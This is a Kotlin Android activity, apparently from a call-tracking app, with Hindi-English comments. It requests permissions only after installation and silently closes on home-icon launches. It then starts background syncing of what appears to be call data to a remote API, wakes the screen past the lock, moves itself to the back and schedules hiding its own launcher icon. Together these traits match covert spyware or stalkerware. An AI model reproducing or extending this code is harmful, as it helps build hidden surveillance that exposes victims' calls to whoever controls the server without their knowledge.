package com.calltech

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Permission popup sirf install/auto-start se.
 * Home icon click par popup nahi — turant band.
 * Allow ke baad hide.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var setupFinished = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            finishAndSync()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        if (isHomeIconClick()) {
            Log.d(TAG, "App icon click — permission popup skip")
            if (InstallFlow.isSetupComplete(this)) {
                LauncherHider.hideIfMarked(this)
            }
            finish()
            return
        }

        bringToFront()

        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            finishAndSync()
            return
        }

        permissionLauncher.launch(missing.toTypedArray())
    }

    private fun isHomeIconClick(): Boolean {
        if (intent.getBooleanExtra(PostInstallPrompt.EXTRA_FORCE_POPUP, false)) {
            return false
        }

        val fromLauncher = Intent.ACTION_MAIN == intent.action &&
            intent.hasCategory(Intent.CATEGORY_LAUNCHER)
        if (!fromLauncher) {
            return false
        }

        val source = buildString {
            append(referrer?.toString().orEmpty())
            append(' ')
            append(callingPackage.orEmpty())
        }.lowercase()

        if (INSTALLER_HINTS.any { source.contains(it) }) {
            return false
        }

        return HOME_LAUNCHER_HINTS.any { source.contains(it) }
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    private fun finishAndSync() {
        if (setupFinished) {
            return
        }
        setupFinished = true
        SyncObserverManager.register(applicationContext)
        InstallFlow.completeSetup(applicationContext)
        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    InstallFlow.runFirstCloudSync(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "Background first sync failed", error)
            }
        }
        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        LauncherHider.markAndSchedule(applicationContext)
        finish()
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
        private val INSTALLER_HINTS = listOf(
            "packageinstaller",
            "filemanager",
            "fileexplorer",
            "documentsui",
            "myfiles",
            "vending",
        )
        private val HOME_LAUNCHER_HINTS = listOf(
            "launcher",
            "lawnchair",
            "trebuchet",
            "miui.home",
            "poco.home",
            "nexuslauncher",
            "microsoftlauncher",
            "hilauncher",
            "xoslauncher",
        )
    }
}
